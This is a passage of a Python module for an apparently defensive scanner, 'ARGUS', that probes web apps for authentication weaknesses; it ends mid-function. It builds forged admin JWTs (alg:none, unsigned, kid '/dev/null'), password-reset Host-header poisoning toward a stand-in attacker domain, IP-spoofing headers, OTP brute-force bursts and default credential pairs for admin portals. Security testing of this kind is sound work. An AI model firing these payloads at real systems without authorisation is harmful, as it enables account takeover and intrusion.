"""
Authentication Bypass & Credential Attack Detection Module for ARGUS.

Actively discovers, audits, and validates authentication bypass vulnerabilities,
credential attacks, session management weaknesses, and token manipulation flaws across
discovered web applications, APIs, and authentication portals.

Key Capabilities:
1. Multi-Vector Authentication Detection Modes (R2):
   - Brute Force & Account Lockout Analysis (unthrottled login attempts, missing CAPTCHA, timing/status user enumeration)
   - Password Reset Abuse (Host/X-Forwarded-Host injection, token predictability, token reuse, expiration checks)
   - MFA / 2FA Bypass (direct endpoint access, response manipulation simulation, parameter omission, OTP brute force)
   - Session Fixation (pre- vs post-login session identifier reuse)
   - JWT Manipulation & Key Confusion (alg:none variations, missing signature validation, RS256->HS256 key confusion, expired token acceptance, header injection)
   - Default Credentials & Portal Fingerprinting (curated credential pairs for admin portals, Tomcat, Grafana, Jenkins, Spring Boot, etc.)
2. Deep Session & Token Analysis (R3):
   - Shannon Entropy analysis of session identifiers and reset tokens
   - Cookie security flags audit (Secure, HttpOnly, SameSite)
   - Session expiration, lifetime, and post-logout revocation checks
   - Auth state and credential leakage in error responses / debug stacks
   - Credential stuffing susceptibility analysis
3. Adversarial Mutation & Evasion Strategies (R4):
   - Case sensitivity permutations (usernames, paths, headers)
   - Unicode normalization and Cyrillic/Fullwidth homoglyphs
   - Auth header manipulation and client IP spoofing (X-Original-URL, X-Forwarded-For loopback trust)
   - Token format and encoding manipulation (Bearer variations, whitespace, padding)
   - Response manipulation and method override detection
4. Strict False Positive Rejection:
   - Suppresses baseline benign requests.
   - Suppresses standard 400/401/403/404/405/415/422 rejections without sensitive data leaks.
   - Suppresses properly throttled rate limits and lockout mechanisms.
   - Suppresses explicit rejection messages in response bodies.
5. Quadruple State Publishing:
   - Publishes findings to raw_mission.evidence, raw_mission.vulnerabilities,
     attack_surface_graph (HAS_VULNERABILITY and HAS_ENDPOINT edges), and ControlledMission.publish_finding.
"""
from __future__ import annotations

import copy
import hashlib
import hmac
import json
import logging
import math
import random
import re
import string
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


# =============================================================================
# Enums & Data Models
# =============================================================================

class AuthBypassSeverity(str, Enum):
    """Enumeration of Authentication vulnerability severity ratings."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# Compatibility aliases
AuthSeverity = AuthBypassSeverity
Severity = AuthBypassSeverity
AuthBypassSeverity.CRIT = AuthBypassSeverity.CRITICAL  # type: ignore[attr-defined]


class AuthVulnerabilityType(str, Enum):
    """Enumeration of Authentication vulnerability detection modes."""
    BRUTE_FORCE = "brute_force"
    PASSWORD_RESET = "password_reset"
    MFA_BYPASS = "mfa_bypass"
    SESSION_FIXATION = "session_fixation"
    JWT_MANIPULATION = "jwt_manipulation"
    DEFAULT_CREDENTIALS = "default_credentials"
    SESSION_TOKEN_ANALYSIS = "session_token_analysis"
    CREDENTIAL_STUFFING = "credential_stuffing"
    EVASION = "evasion"


# Compatibility aliases for Auth vulnerability types
AuthVulnerabilityType.ACCOUNT_LOCKOUT_MISSING = AuthVulnerabilityType.BRUTE_FORCE  # type: ignore[attr-defined]
AuthVulnerabilityType.PASSWORD_RESET_ABUSE = AuthVulnerabilityType.PASSWORD_RESET  # type: ignore[attr-defined]
AuthVulnerabilityType.TWO_FACTOR_BYPASS = AuthVulnerabilityType.MFA_BYPASS  # type: ignore[attr-defined]
AuthVulnerabilityType.JWT_BYPASS = AuthVulnerabilityType.JWT_MANIPULATION  # type: ignore[attr-defined]
AuthVulnerabilityType.DEFAULT_CREDS = AuthVulnerabilityType.DEFAULT_CREDENTIALS  # type: ignore[attr-defined]
AuthVulnerabilityType.SESSION_SECURITY = AuthVulnerabilityType.SESSION_TOKEN_ANALYSIS  # type: ignore[attr-defined]
AuthBypassTechnique = AuthVulnerabilityType
AuthTechnique = AuthVulnerabilityType


class AuthMutationStrategy(str, Enum):
    """Enumeration of Authentication probe mutation and evasion strategies."""
    CASE_SENSITIVITY = "case_sensitivity"
    UNICODE_NORMALIZATION = "unicode_normalization"
    AUTH_HEADER_MANIPULATION = "auth_header_manipulation"
    TOKEN_FORMAT_MANIPULATION = "token_format_manipulation"
    RESPONSE_MANIPULATION = "response_manipulation"
    STANDARD = "standard"


# Compatibility aliases
AuthBypassMutationStrategy = AuthMutationStrategy
AuthStrategy = AuthMutationStrategy
AuthMutationStrategy.CASE_VARIATION = AuthMutationStrategy.CASE_SENSITIVITY  # type: ignore[attr-defined]
AuthMutationStrategy.HOMOGLYPH = AuthMutationStrategy.UNICODE_NORMALIZATION  # type: ignore[attr-defined]
AuthMutationStrategy.HEADER_SPOOFING = AuthMutationStrategy.AUTH_HEADER_MANIPULATION  # type: ignore[attr-defined]
AuthMutationStrategy.TOKEN_FORMAT = AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION  # type: ignore[attr-defined]
AuthMutationStrategy.METHOD_OVERRIDE = AuthMutationStrategy.RESPONSE_MANIPULATION  # type: ignore[attr-defined]


@dataclass
class AuthBypassProbe:
    """Represents a targeted authentication bypass probe attempt."""
    probe_id: str
    target_url: str
    method: str = "GET"
    vulnerability_type: Union[AuthVulnerabilityType, str] = AuthVulnerabilityType.BRUTE_FORCE
    strategy: Union[AuthMutationStrategy, str] = AuthMutationStrategy.STANDARD
    headers: Dict[str, str] = field(default_factory=dict)
    params: Dict[str, Any] = field(default_factory=dict)
    json_data: Optional[Any] = None
    data: Optional[Any] = None
    canary_token: str = ""
    tested_parameter: str = ""
    original_value: Any = None
    tampered_value: Any = None
    is_auth_required: bool = False
    secondary_identity: Optional[Any] = None
    burst_count: int = 1
    is_benign: bool = False
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AuthBypassProbeResponse:
    """Captures the response outcome and metadata from an authentication probe execution."""
    probe: AuthBypassProbe
    status_code: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    json_body: Optional[Any] = None
    elapsed: float = 0.0
    error: Optional[str] = None
    raw_http_response: Optional[HttpResponse] = None
    burst_responses: List[Dict[str, Any]] = field(default_factory=list)
    rate_limit_headers: Dict[str, str] = field(default_factory=dict)
    sensitive_fields_detected: List[str] = field(default_factory=list)
    error_disclosure_detected: Optional[str] = None
    is_persisted: bool = False
    is_unauthorized_access: bool = False


@dataclass
class AuthBypassResult:
    """Represents an evaluated and confirmed authentication security finding."""
    template_id: str
    technique: str
    vulnerability_type: Union[AuthVulnerabilityType, str]
    mutation_strategy: str
    endpoint_url: str
    severity: str
    cwe_id: str
    cvss_score: float
    description: str
    evidence_snippet: str = ""
    parameter: str = ""
    status_code: int = 200
    confidence: float = 0.95
    is_valid_finding: bool = True
    metadata: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# Mathematical Shannon Entropy & Token Analysis Helper
# =============================================================================

class TokenEntropyAnalyzer:
    """
    Evaluates Shannon entropy, predictability, and structure of authentication tokens
    and session identifiers according to NIST SP 800-63B and OWASP ASVS v4.0.
    """

    @staticmethod
    def calculate_shannon_entropy(token: str) -> float:
        """
        Computes Shannon entropy in bits per character:
        H(S) = - sum( P(c) * log2(P(c)) )
        """
        if not token:
            return 0.0
        # Strip optional static prefixes (e.g., sess_, usr_, bearer_)
        clean_token = re.sub(r"^(sess_|usr_|tok_|auth_|jwt_)", "", token, flags=re.IGNORECASE)
        if not clean_token:
            clean_token = token

        length = len(clean_token)
        freq: Dict[str, int] = {}
        for c in clean_token:
            freq[c] = freq.get(c, 0) + 1

        entropy = 0.0
        for count in freq.values():
            p = count / length
            if p > 0.0:
                entropy -= p * math.log2(p)
        return round(entropy, 4)

    @staticmethod
    def detect_sequential_tokens(tokens: List[str]) -> bool:
        """
        Detects if a sequence of collected tokens exhibits sequential increment or low edit distance.
        """
        if len(tokens) < 3:
            return False

        # Check numeric integer progression
        numeric_tokens = []
        for t in tokens:
            try:
                numeric_tokens.append(int(re.sub(r"\D", "", t) or "-1"))
            except Exception:
                pass

        if len(numeric_tokens) >= 3 and all(n >= 0 for n in numeric_tokens):
            diffs = [numeric_tokens[i + 1] - numeric_tokens[i] for i in range(len(numeric_tokens) - 1)]
            if len(set(diffs)) == 1 and diffs[0] in (1, 2, 10, 100):
                return True

        # Check Levenshtein distance on strings
        def edit_distance(s1: str, s2: str) -> int:
            if len(s1) < len(s2):
                return edit_distance(s2, s1)
            if len(s2) == 0:
                return len(s1)
            prev = range(len(s2) + 1)
            for i, c1 in enumerate(s1):
                curr = [i + 1]
                for j, c2 in enumerate(s2):
                    insertions = prev[j + 1] + 1
                    deletions = curr[j] + 1
                    substitutions = prev[j] + (c1 != c2)
                    curr.append(min(insertions, deletions, substitutions))
                prev = curr
            return prev[-1]

        distances = [edit_distance(tokens[i], tokens[i + 1]) for i in range(len(tokens) - 1)]
        avg_dist = sum(distances) / len(distances)
        # For tokens of length >= 12, an average edit distance <= 2 is highly indicative of predictability
        if all(len(t) >= 12 for t in tokens) and avg_dist <= 2.0:
            return True

        return False

    @staticmethod
    def detect_timestamp_leak(token: str) -> bool:
        """
        Detects if a token embeds an obvious timestamp (Unix epoch seconds or milliseconds).
        """
        if not token:
            return False
        current_time = int(time.time())
        # Look for 10-digit epoch or 13-digit epoch ms
        matches = re.findall(r"\b(\d{10}|\d{13})\b", token)
        for m in matches:
            val = int(m[:10])
            # Within +/- 10 days of current time
            if abs(val - current_time) < 864000:
                return True
        return False


# =============================================================================
# Payload Generator
# =============================================================================

class AuthBypassPayloadGenerator:
    """
    Synthesizes targeted authentication bypass probes, session manipulation vectors,
    default credential pairs, and adversarial evasion payloads across all 6 detection modes.
    """

    # Curated default credential dictionary
    DEFAULT_CREDENTIALS_MAP: List[Tuple[str, str, str]] = [
        ("admin", "admin", "Generic Web Admin"),
        ("admin", "password", "Generic Web Admin"),
        ("admin", "123456", "Generic Web Admin"),
        ("admin", "admin123", "Generic Web Admin"),
        ("root", "root", "Generic Root"),
        ("root", "toor", "Generic Root"),
        ("administrator", "administrator", "Windows/Generic Admin"),
        ("tomcat", "s3cret", "Apache Tomcat"),
        ("tomcat", "tomcat", "Apache Tomcat"),
        ("kibana", "kibana", "Elasticsearch / Kibana"),
        ("elastic", "changeme", "Elasticsearch"),
        ("grafana", "admin", "Grafana"),
        ("jenkins", "jenkins", "Jenkins CI"),
        ("spring", "spring", "Spring Boot Actuator"),
        ("actuator", "actuator", "Spring Boot Actuator"),
    ]

    def __init__(self) -> None:
        self._counter = 0

    def generate_canary(self, prefix: str = "ARGUS_AUTH") -> str:
        """Generates a unique traceable canary token for auth validation."""
        self._counter += 1
        return f"{prefix}_{int(time.time())}_{self._counter}_{uuid.uuid4().hex[:8]}"

    def generate_benign_baseline_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates baseline requests to capture standard unauthenticated/benign behavior."""
        return [
            AuthBypassProbe(
                probe_id=f"probe_baseline_get_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                is_benign=True,
                metadata={"description": "Benign GET baseline request"},
            ),
            AuthBypassProbe(
                probe_id=f"probe_baseline_post_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"username": "argus_benign_user", "password": "argus_benign_password"},
                is_benign=True,
                metadata={"description": "Benign POST baseline request with non-existent credentials"},
            ),
        ]

    # -------------------------------------------------------------------------
    # Detection Mode 1: Brute Force & Account Lockout
    # -------------------------------------------------------------------------
    def generate_brute_force_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates probe sequences to test missing account lockout, CAPTCHA, and timing leaks."""
        probes = []
        canary_user = f"user_{uuid.uuid4().hex[:6]}"

        # Burst login probe to detect missing account lockout
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_bf_burst_lockout_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"username": "admin", "password": "InvalidPassword123!"},
                burst_count=10,
                tested_parameter="password",
                metadata={"technique": "account_lockout_missing", "target_username": "admin"},
            )
        )

        # Non-existent user probe for timing/enumeration differential comparison
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_bf_enum_timing_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"username": canary_user, "password": "InvalidPassword123!"},
                burst_count=5,
                tested_parameter="username",
                metadata={"technique": "username_enumeration_timing", "invalid_username": canary_user},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 2: Password Reset Abuse
    # -------------------------------------------------------------------------
    def generate_password_reset_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates password reset vulnerability probes (Host header poisoning, token reuse)."""
        probes = []
        poisoned_host = "attacker-controlled-argus.evil"

        # Host / X-Forwarded-Host injection
        for header_name in ["Host", "X-Forwarded-Host", "X-Forwarded-Server", "X-Host"]:
            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_pwd_reset_host_{header_name.lower().replace('-', '_')}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="POST",
                    vulnerability_type=AuthVulnerabilityType.PASSWORD_RESET,
                    strategy=AuthMutationStrategy.AUTH_HEADER_MANIPULATION,
                    headers={header_name: poisoned_host},
                    json_data={"email": "victim@example.com", "username": "victim"},
                    tested_parameter=header_name,
                    tampered_value=poisoned_host,
                    metadata={"technique": "password_reset_host_injection", "poisoned_host": poisoned_host},
                )
            )

        # Reset token reuse simulation probe
        dummy_token = f"tok_reset_{uuid.uuid4().hex}"
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_pwd_reset_token_reuse_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.PASSWORD_RESET,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"token": dummy_token, "new_password": "NewSecretPassword123!"},
                tested_parameter="token",
                metadata={"technique": "reset_token_reuse", "token": dummy_token},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 3: MFA / 2FA Bypass
    # -------------------------------------------------------------------------
    def generate_mfa_bypass_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates MFA bypass probes (direct browsing, response manipulation, parameter omission)."""
        probes = []

        # Forced browsing / direct access with Phase 1 session
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_mfa_forced_browsing_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.MFA_BYPASS,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Authorization": "Bearer mfa_phase1_intermediate_token"},
                tested_parameter="Authorization",
                metadata={"technique": "mfa_forced_browsing"},
            )
        )

        # Parameter omission & state injection (omitting OTP code or asserting mfa_completed)
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_mfa_param_omission_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.MFA_BYPASS,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"skip_mfa": True, "mfa_completed": 1, "otp": None},
                tested_parameter="skip_mfa",
                metadata={"technique": "missing_mfa_enforcement"},
            )
        )

        # Unthrottled OTP Brute Force burst
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_mfa_otp_brute_force_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.MFA_BYPASS,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"code": "000000"},
                burst_count=15,
                tested_parameter="code",
                metadata={"technique": "unthrottled_otp_brute_force"},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 4: Session Fixation
    # -------------------------------------------------------------------------
    def generate_session_fixation_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates session fixation verification probes."""
        preset_session_id = f"sess_fixed_{uuid.uuid4().hex[:16]}"
        return [
            AuthBypassProbe(
                probe_id=f"probe_session_fixation_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.SESSION_FIXATION,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Cookie": f"session={preset_session_id}; JSESSIONID={preset_session_id}"},
                json_data={"username": "admin", "password": "admin_password"},
                tested_parameter="Cookie",
                tampered_value=preset_session_id,
                metadata={"technique": "session_fixation", "preset_session_id": preset_session_id},
            )
        ]

    # -------------------------------------------------------------------------
    # Detection Mode 5: JWT Manipulation & Key Confusion
    # -------------------------------------------------------------------------
    def generate_jwt_manipulation_probes(
        self, endpoint_url: str, sample_jwt: Optional[str] = None
    ) -> List[AuthBypassProbe]:
        """Generates JWT manipulation probes (alg:none, missing signature, header injection)."""
        probes = []

        def b64url(s: str) -> str:
            import base64
            return base64.urlsafe_b64encode(s.encode("utf-8")).decode("utf-8").rstrip("=")

        admin_payload = json.dumps({"sub": "admin", "role": "admin", "isAdmin": True, "iat": int(time.time())})
        b64_payload = b64url(admin_payload)

        # 1. alg: "none" variations
        for alg in ["none", "None", "NONE", "nOnE"]:
            b64_header = b64url(json.dumps({"alg": alg, "typ": "JWT"}))
            # Ending with dot (standard alg: none)
            token_dot = f"{b64_header}.{b64_payload}."
            # Ending without dot
            token_nodot = f"{b64_header}.{b64_payload}"

            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_jwt_alg_none_{alg}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="GET",
                    vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                    strategy=AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION,
                    headers={"Authorization": f"Bearer {token_dot}"},
                    tested_parameter="Authorization",
                    tampered_value=f"alg:{alg}",
                    metadata={"technique": "jwt_alg_none", "jwt": token_dot, "alg": alg},
                )
            )

        # 2. Missing signature with original header
        b64_hs_header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
        token_unsigned = f"{b64_hs_header}.{b64_payload}."
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_jwt_unsigned_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                strategy=AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION,
                headers={"Authorization": f"Bearer {token_unsigned}"},
                tested_parameter="Authorization",
                metadata={"technique": "jwt_signature_not_verified", "jwt": token_unsigned},
            )
        )

        # 3. Expired token acceptance
        expired_payload = json.dumps({"sub": "admin", "role": "admin", "exp": int(time.time()) - 86400})
        b64_exp_payload = b64url(expired_payload)
        token_expired = f"{b64_hs_header}.{b64_exp_payload}.dummysignature"
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_jwt_expired_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Authorization": f"Bearer {token_expired}"},
                tested_parameter="Authorization",
                metadata={"technique": "jwt_expired_accepted", "jwt": token_expired},
            )
        )

        # 4. Header parameter injection (kid path traversal / dev null)
        b64_kid_header = b64url(json.dumps({"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}))
        sig_empty_key = hmac.new(b"", f"{b64_kid_header}.{b64_payload}".encode("utf-8"), hashlib.sha256).digest()
        import base64
        b64_sig = base64.urlsafe_b64encode(sig_empty_key).decode("utf-8").rstrip("=")
        token_kid = f"{b64_kid_header}.{b64_payload}.{b64_sig}"
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_jwt_kid_injection_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Authorization": f"Bearer {token_kid}"},
                tested_parameter="kid",
                metadata={"technique": "jwt_header_injection", "jwt": token_kid},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 6: Default Credentials
    # -------------------------------------------------------------------------
    def generate_default_credentials_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates default credential probes targeting administrative portals and APIs."""
        probes = []
        import base64

        for user, pwd, service in self.DEFAULT_CREDENTIALS_MAP[:8]:
            # JSON POST probe
            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_default_cred_json_{user}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="POST",
                    vulnerability_type=AuthVulnerabilityType.DEFAULT_CREDENTIALS,
                    strategy=AuthMutationStrategy.STANDARD,
                    json_data={"username": user, "password": pwd},
                    tested_parameter="username:password",
                    metadata={"technique": "default_credentials", "username": user, "password": pwd, "service": service},
                )
            )

            # HTTP Basic Auth probe
            b64_auth = base64.b64encode(f"{user}:{pwd}".encode("utf-8")).decode("utf-8")
            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_default_cred_basic_{user}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="GET",
                    vulnerability_type=AuthVulnerabilityType.DEFAULT_CREDENTIALS,
                    strategy=AuthMutationStrategy.STANDARD,
                    headers={"Authorization": f"Basic {b64_auth}"},
                    tested_parameter="Authorization",
                    metadata={"technique": "default_credentials", "username": user, "password": pwd, "service": service},
                )
            )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 7: Session Token Analysis & Cookie Security
    # -------------------------------------------------------------------------
    def generate_session_token_analysis_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates probes to audit session entropy, cookie attributes, and expiration."""
        return [
            AuthBypassProbe(
                probe_id=f"probe_session_audit_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.SESSION_TOKEN_ANALYSIS,
                strategy=AuthMutationStrategy.STANDARD,
                metadata={"technique": "session_token_analysis"},
            )
        ]

    # -------------------------------------------------------------------------
    # Detection Mode 8: Credential Stuffing Susceptibility
    # -------------------------------------------------------------------------
    def generate_credential_stuffing_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates distributed IP simulation probes to test credential stuffing resistance."""
        return [
            AuthBypassProbe(
                probe_id=f"probe_cred_stuffing_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.CREDENTIAL_STUFFING,
                strategy=AuthMutationStrategy.AUTH_HEADER_MANIPULATION,
                json_data={"username": "victim@example.com", "password": "WrongPassword123!"},
                burst_count=10,
                tested_parameter="X-Forwarded-For",
                metadata={"technique": "credential_stuffing_susceptible"},
            )
        ]

    # -------------------------------------------------------------------------
    # Mutation & Evasion Strategies (5 Strategies)
    # -------------------------------------------------------------------------
    def apply_case_sensitivity_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Mutates usernames, path cases, or headers to bypass case-sensitive filters."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.CASE_SENSITIVITY
        mutated.probe_id = f"{probe.probe_id}_case_mut"

        if isinstance(mutated.json_data, dict):
            if "username" in mutated.json_data:
                u = str(mutated.json_data["username"])
                mutated.json_data["username"] = u.capitalize() if u.islower() else u.upper()

        parsed = urllib.parse.urlparse(mutated.target_url)
        if "/admin" in parsed.path:
            new_path = parsed.path.replace("/admin", "/Admin")
            mutated.target_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
        return mutated

    def apply_unicode_normalization_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Injects Cyrillic homoglyphs or Fullwidth characters to test normalization bypasses."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.UNICODE_NORMALIZATION
        mutated.probe_id = f"{probe.probe_id}_unicode_mut"

        if isinstance(mutated.json_data, dict) and "username" in mutated.json_data:
            orig = str(mutated.json_data["username"])
            # Replace Latin 'a' with Cyrillic 'а' (U+0430)
            homoglyph = orig.replace("a", "\u0430").replace("o", "\u043e")
            mutated.json_data["username"] = homoglyph
            mutated.tampered_value = homoglyph
        return mutated

    def apply_auth_header_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Injects loopback IP headers and identity override headers."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.AUTH_HEADER_MANIPULATION
        mutated.probe_id = f"{probe.probe_id}_hdr_mut"

        mutated.headers.update({
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "X-Custom-IP-Authorization": "127.0.0.1",
        })
        return mutated

    def apply_token_format_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Mutates Bearer token prefixes, whitespace, and padding."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION
        mutated.probe_id = f"{probe.probe_id}_tok_mut"

        if "Authorization" in mutated.headers:
            val = mutated.headers["Authorization"]
            if val.startswith("Bearer "):
                tok = val[7:]
                # Double space after Bearer or lower case bearer
                mutated.headers["Authorization"] = f"bearer  {tok}"
        return mutated

    def apply_response_manipulation_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Applies HTTP method override headers to test authorization filters."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.RESPONSE_MANIPULATION
        mutated.probe_id = f"{probe.probe_id}_resp_mut"

        mutated.headers["X-HTTP-Method-Override"] = "GET"
        return mutated

    def apply_mutation(
        self, probe: AuthBypassProbe, strategy: Union[AuthMutationStrategy, str]
    ) -> AuthBypassProbe:
        """Dispatches probe mutation based on strategy."""
        strat = AuthMutationStrategy(strategy) if isinstance(strategy, str) else strategy
        if strat == AuthMutationStrategy.CASE_SENSITIVITY:
            return self.apply_case_sensitivity_mutation(probe)
        elif strat == AuthMutationStrategy.UNICODE_NORMALIZATION:
            return self.apply_unicode_normalization_mutation(probe)
        elif strat == AuthMutationStrategy.AUTH_HEADER_MANIPULATION:
            return self.apply_auth_header_mutation(probe)
        elif strat == AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION:
            return self.apply_token_format_mutation(probe)
        elif strat == AuthMutationStrategy.RESPONSE_MANIPULATION:
            return self.apply_response_manipulation_mutation(probe)
        return copy.deepcopy(probe)

    def generate_all_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Compiles all baseline, detection mode, and mutated probes for an endpoint."""
        probes: List[AuthBypassProbe] = []

        # 1. Baselines
        probes.extend(self.generate_benign_baseline_probes(endpoint_url))

        # 2. Multi-vector Detection Modes
        probes.extend(self.generate_brute_force_probes(endpoint_url))
        probes.extend(self.generate_password_reset_probes(endpoint_url))
        probes.extend(self.generate_mfa_bypass_probes(endpoint_url))
        probes.extend(self.generate_session_fixation_probes(endpoint_url))
        probes.extend(self.generate_jwt_manipulation_probes(endpoint_url))
        probes.extend(self.generate_default_credentials_probes(endpoint_url))
        probes.extend(self.generate_session_token_analysis_probes(endpoint_url))
        probes.extend(self.generate_credential_stuffing_probes(endpoint_url))

        # 3. Apply Mutations across representative probes
        mutated_probes: List[AuthBypassProbe] = []
        for p in probes:
            if not p.is_benign and p.vulnerability_type in (
                AuthVulnerabilityType.BRUTE_FORCE,
                AuthVulnerabilityType.DEFAULT_CREDENTIALS,
                AuthVulnerabilityType.MFA_BYPASS,
            ):
                mutated_probes.append(self.apply_case_sensitivity_mutation(p))
                mutated_probes.append(self.apply_unicode_normalization_mutation(p))
                mutated_probes.append(self.apply_auth_header_mutation(p))

        probes.extend(mutated_probes)
        return probes


# =============================================================================
# Prober
# =============================================================================

class AuthBypassProber:
    """
    Executes authentication bypass validation probes using AuthenticatedHttpClient
    or mock clients, handling burst sequences, timing measurements, and multi-identity execution.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        client: Optional[Any] = None,
        timeout: float = 10.0,
    ) -> None:
        self.client = http_client or client or AuthenticatedHttpClient(timeout=timeout)
        self.timeout = timeout

    def execute_probe(
        self, mission: Any, target_url: str, probe: AuthBypassProbe
    ) -> AuthBypassProbeResponse:
        """Executes a single or burst authentication probe and constructs an AuthBypassProbeResponse."""
        if probe.burst_count > 1:
            burst_resps = self.execute_burst_sequence(mission, target_url, probe, count=probe.burst_count)
            first_resp = burst_resps[0] if burst_resps else {}
            last_resp = burst_resps[-1] if burst_resps else {}

            headers = {k.lower(): v for k, v in last_resp.get("headers", {}).items()}
            return AuthBypassProbeResponse(
                probe=probe,
                status_code=last_resp.get("status_code", 0),
                headers=headers,
                body=last_resp.get("body", ""),
                json_body=last_resp.get("json_body"),
                elapsed=last_resp.get("elapsed", 0.0),
                error=last_resp.get("error"),
                burst_responses=burst_resps,
                rate_limit_headers={k: v for k, v in headers.items() if "ratelimit" in k or "retry-after" in k},
            )

        start_time = time.time()
        status_code = 0
        headers_dict: Dict[str, str] = {}
        body = ""
        json_body = None
        error_msg = None
        raw_resp = None

        try:
            # Client polymorphism support
            method = probe.method.upper()
            url = probe.target_url or target_url
            kwargs: Dict[str, Any] = {
                "headers": dict(probe.headers),
                "params": dict(probe.params),
